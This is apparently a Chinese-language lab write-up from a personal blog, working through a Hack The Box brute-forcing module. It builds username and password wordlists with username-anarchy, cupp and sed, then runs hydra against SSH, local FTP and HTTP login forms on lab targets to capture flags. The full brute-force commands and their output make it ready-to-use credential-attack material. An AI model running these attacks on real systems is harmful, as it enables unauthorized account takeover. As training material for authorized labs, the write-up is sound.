+<p>该工具有许多用例，我们可以利用这些用例来创建潜在用户名的高级列表。然而，对于我们的简单用例，我们可以简单地运行它，并提供名字&#x2F;姓氏作为参数，然后将输出转发到一个文件中，如下所示：</p>
+<pre><code class="bash">./username-anarchy Bill Gates &gt; bill.txt
+</code></pre>
+<p>我们最终应该准备好用户名和密码的单词列表，这样我们就可以攻击SSH服务器了。</p>
+<h1 id="Service-Authentication-Brute-Forcing"><a href="#Service-Authentication-Brute-Forcing" class="headerlink" title="Service Authentication Brute Forcing"></a>Service Authentication Brute Forcing</h1><h2 id="SSH-Attack"><a href="#SSH-Attack" class="headerlink" title="SSH Attack"></a>SSH Attack</h2><p>用于攻击登录服务的命令相当简单。我们只需提供用户名&#x2F;密码单词列表，并添加service:&#x2F;&#x2F;SERVER_IP:PORT最后。像往常一样，我们将添加-u-f标志。最后，当我们第一次运行该命令时，hydra将建议我们为最大并行尝试次数添加-t 4标志，因为许多SSH限制了并行连接的数量并丢弃其他连接，导致我们的许多尝试被丢弃。我们的最终命令如下：</p>
+<pre><code class="shell-session">Tanin@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
+
+Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task
+[DATA] attacking ssh://178.35.49.134:22/
+[STATUS] 77.00 tries/min, 77 tries in 00:01h, 157039 to do in 33:60h, 4 active
+[PORT][ssh] host: 178.35.49.134   login: b.gates   password: ...SNIP...
+[STATUS] attack finished for 178.35.49.134 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+</code></pre>
+<pre><code class="shell-session">Tanin@htb[/htb]$ ssh b.gates@178.35.49.134 -p 22
+
+b.gates@SERVER_IP&#39;s password: ********
+
+b.gates@bruteforcing:~$ whoami
+b.gates
+</code></pre>
+<h2 id="FTP-Brute-Forcing"><a href="#FTP-Brute-Forcing" class="headerlink" title="FTP Brute Forcing"></a>FTP Brute Forcing</h2><p>一旦我们进入，我们就可以查看系统上的其他用户</p>
+<pre><code class="shell-session">b.gates@bruteforcing:~$ ls /home
+
+b.gates  m.gates
+</code></pre>
+<p>我们注意到另一个用户m.gates。我们在本地侦察中也注意到端口21在本地打开，这表明FTP必须可用：</p>
+<pre><code class="shell-session">b.gates@bruteforcing:~$ netstat -antp | grep -i list
+
+(No info could be read for &quot;-p&quot;: geteuid()=1000 but you should be root.)
+tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - 
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -   
+</code></pre>
+<p>接下来，我们现在可以尝试强制m.gates用户进行FTP登录。</p>
+<blockquote>
+<p>注1：有时管理员会使用不同的工具测试他们的安全措施和策略。在这种情况下，该web服务器的管理员一直安装着“hydra”。我们可以从中受益，并通过本地或远程攻击FTP服务来对抗本地系统。</p>
+</blockquote>
+<blockquote>
+<p>注2：rockyou-10.txt是“rockyu.txt”的较短版本，包含14344391个密码。</p>
+</blockquote>
+<p>因此，与我们攻击SSH服务的方式类似，我们可以对FTP进行类似的攻击：</p>
+<pre><code class="shell-session">b.gates@bruteforcing:~$ hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1
+
+Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
+[DATA] attacking ftp://127.0.0.1:21/
+
+[21][ftp] host: 127.0.0.1   login: m.gates   password: &lt;...SNIP...&gt;
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra)
+</code></pre>
+<p>要切换到该用户：</p>
+<pre><code class="shell-session">b.gates@bruteforcing:~$ su - m.gates
+</code></pre>
+<h2 id="practice1-1"><a href="#practice1-1" class="headerlink" title="practice1.1"></a>practice1.1</h2><blockquote>
+<p>target:94.237.55.13：34133</p>
+<p>使用您在本节中学到的知识，尝试在上面显示的目标服务器中暴力破解用户“b.gates”的SSH登录。然后尝试通过 SSH 连接到服务器。</p>
+</blockquote>
+<p>先用cupp做一个字典：大体按照学院的示例中的内容填写</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111116559.png" alt="image-20230711111612191"></p>
+<p>密码策略：</p>
+<pre><code class="bash">sed -ri &#39;/^.&#123;,7&#125;$/d&#39; william.txt            # remove shorter than 8
+sed -ri &#39;/[!-/:-@\[-`\&#123;-~]+/!d&#39; william.txt # remove no special chars
+sed -ri &#39;/[0-9]+/!d&#39; william.txt            # remove no numbers
+</code></pre>
+<p>这里他给了用户名，静态分配用户名即可就不必生成用户名字典了</p>
+<pre><code>hydra -l b.gates -P william.txt -u -f ssh://94.237.55.13:34133
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111122537.png" alt="image-20230711112243016"></p>
+<p>然后到home中拿到flag</p>
+<h2 id="practice1-2"><a href="#practice1-2" class="headerlink" title="practice1.2"></a>practice1.2</h2><blockquote>
+<p>ssh登录后，尝试强制其他用户进行FTP登录。您应该在它们的主目录中找到另一个flag.</p>
+</blockquote>
+<p>我们在home文件中知道另一个用户是m.gates，并且在本用户目录下给了一个rockyou文本，并且服务器安装了hydra那么按照示例中的操作打就可以了;</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111128017.png" alt="image-20230711112849950"></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111136428.png" alt="image-20230711113652067"></p>
+<h1 id="Skills-Assessment-—-website"><a href="#Skills-Assessment-—-website" class="headerlink" title="Skills Assessment — website"></a>Skills Assessment <em>— website</em></h1><blockquote>
+<p>我们的客户要求对其网络上的另一台主机进行额外的黑匣子渗透测试。经过主机和端口扫描，我们发现只有一个TCP端口打开。由于我们已经在另一台主机上发现了弱凭据，因此新主机可能容易受到相同漏洞类型的攻击。在我们的参与过程中，我们也应该考虑不同的单词表。</p>
+<p>target : 94.237.59.206:39321</p>
+<p>当你试图访问上面显示的IP时，你将没有访问它的授权。强行进行身份验证并检索flag。</p>
+<p>一旦你访问了登录页面，你的任务就是强行进入这个页面。里面藏着什么flag？</p>
+</blockquote>
+<p>根据提示该主机有弱凭据，并且让考虑不同的单词表，应该就是说使用不同的Default-Credentials 字典爆破：</p>
+<p>这里使用了尝试使用了一下简写：     </p>
+<p><code>hydra -C ftp-betterdefaultpasslist.txt http-get://94.237.59.206:39321</code>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                </p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111250415.png" alt="image-20230711125048090"></p>
+<p>登录网页得到第一个flag，并且又可以进入这个login页面</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111255019.png" alt="image-20230711125518477"></p>
+<p>按照之前的做法，先去看看登录时发送的参数以及传参方式，这里跟示例中一样是post传参并且参数为user和pass，然后失败的判定字符串为这个login表单,这里我们截取一部分就好了：</p>
+<pre><code>form name=&#39;log-in&#39;
+</code></pre>
+<p>在示例中两个页面的用户名是一样的，这里是不是也一样呢？毕竟只是作为一个工具练习，没必要用两个字典跑很久，如果不行就只能找用户名字典＋rockyou了</p>
+<pre><code>hydra -l user -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 94.237.59.206 -s 39321 http-post-form &quot;/admin_login.php:user=^USER^&amp;pass=^PASS^:F=form name=&#39;log-in&#39;&quot;
+</code></pre>
+<p>这里尝试简写但是失败了，只能老老实实来，然后也要注意语序</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111341779.png" alt="image-20230711134140132"></p>
+<p>这里挺离谱的，我直接在浏览器里F12查看post包，然后就顺带在里面看源码，结果发现F12里面的的标签<code>form name=&#39;log-in&#39;</code>是双引号，导致爆破半天密码不对，很无语</p>
+<h1 id="Skills-Assessment-—-Service-Login"><a href="#Skills-Assessment-—-Service-Login" class="headerlink" title="Skills Assessment — Service Login"></a>Skills Assessment — Service Login</h1><blockquote>
+<p>我们得到了一个在线学院的IP地址，但没有关于他们网站的进一步信息。作为进行渗透测试的第一步，我们必须确定网站和其他登录服务中是否使用了任何弱凭据。 不仅仅关注默认&#x2F;通用密码。使用本模块中学习的技能收集有关我们确定的员工的信息，以创建自定义单词列表来攻击他们的帐户。 使用我们在模块部分介绍的技能攻击web应用程序并提交两个标志，然后提交它们以完成本模块。</p>
+<p>target:83.136.255.143:58141</p>
+<p>由于您现在已经掌握了上一个技能评估问题中员工的姓名，请尝试收集他们的基本信息，并生成符合密码策略的自定义密码单词列表。还可以使用“用户名生成器”为员工生成潜在用户名。最后，尝试强行使用上面显示的SSH服务器来获取标志。</p>
+<p>一旦您进入，您应该会发现服务器中存在另一个用户。尝试强行登录，并获取他们的标志。</p>
+</blockquote>
+<p>这里看描述应该是进行后半段的复现，这里只有一个名字是Harry potter，先try：</p>
+<p><code>cupp -i </code>先创建一个只有名字为信息的密码本</p>
+<p>使用<code>anarchy</code>生成用户名:<code>./username-anarchy Harry Potter &gt; harry.txt</code></p>
+<p>然后用生成的两个文本进行爆破，根据题目应该是使用ssh：</p>
+<pre><code>hydra -L username-anarchy/harry.txt -P harry.txt -u -f ssh://83.136.255.143:58141 -t 4
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111704081.png" alt="image-20230711170429477"></p>
+<p>还是跑了挺长时间的，这里ssh连接要使用-p 指定端口,不然会显示权限被拒绝，可能是默认访问的端口没给权限。</p>
+<p>ssh连接后就更之前示例中的联系一毛一样了，给了个rockyou然后通过ftp横向移动：</p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111713249.png" alt="image-20230711171301439"></p>
+<p><code>hydra -l g.potter -P rockyou-30.txt -u -f ftp://127.0.0.1</code></p>
+<p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307111730018.png" alt="image-20230711173037437"></p>
+<p>ok</p>
+
+    </div>
+
+    
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <div id="comment">
+        <div id="gitalk-container">
+        </div>
+    </div>
+    
+</div>
+                     
+<footer id="footer">
+    <div class="footer-wrap">
+        <div>
+            © 2018 - 2023 Salve
+            <span class="footer-icon">
+                <a-icon type="flag" theme="filled" /></span>
+            @TiAmo
+        </div>
+        <div></div>
+        <div>Based on the <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo Engine</a> & <a
+                target="_blank" rel="noopener" href="https://github.com/korilin/hexo-theme-particle">Particle Theme</a></div>
+        
+    </div>
+
+</footer>
+
+<script src="/js/highlight.min.js"></script>
+<script src="/js/particle.js"></script>
+                </div>
+            </div>
+        </transition>
+    </div>
+
+    <script>
+    new Vue({
+        el: "#layout",
+        data: {
+            show_page: false,
+            onload_menu: false,
+            menu_show: false,
+            card_top: 100
+        },
+        created: function () {
+            var that = this
+            window.onload = function () {
+                that.show_page = true
+                document.getElementById("loadcontent").style.opacity = 0
+                setTimeout(function () {
+                    document.getElementById("loadleft").style.width = 0
+                    document.getElementById("loadright").style.width = 0
+                }, 300)
+                setTimeout(function () {
+                    document.getElementById("loading").style = "display:none"
+                }, 600)
+            }
+        },
+        mounted: function () {
+            var that = this
+            window.addEventListener('scroll', function (e) {
+                that.menu_show = false
+            })
+        },
+        methods: {
+            home_click: function () {
+                window.scrollTo({
+                    top: window.innerHeight - 80,
+                    behavior: "smooth",
+                });
+            }
+        }
+    })
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script>
+    const gitalk = new Gitalk({
+        clientID: '',
+        clientSecret: '',
+        repo: 'hexo-theme-particle',      // The repository of store comments,
+        owner: 'korilin',
+        admin: ['korilin'],
+        language: 'en',
+        id: location.pathname,      // Ensure uniqueness and length less than 50
+        distractionFreeMode: true  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+
+</body>
+
+</html>
